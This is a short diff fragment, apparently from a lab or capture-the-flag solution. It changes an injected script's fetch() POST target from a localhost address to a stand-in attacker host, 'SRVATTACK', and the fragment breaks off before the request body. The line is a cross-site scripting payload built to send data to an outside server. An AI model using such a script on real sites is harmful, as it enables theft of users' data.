@@ -278,7 +278,7 @@ SOLUTION
 
 
 <script>
-fetch("http://localhost:3000/attack", {
+fetch("http://SRVATTACK/attack", {
     method: "POST",
     headers: {
         "Content-Type": "application/json"
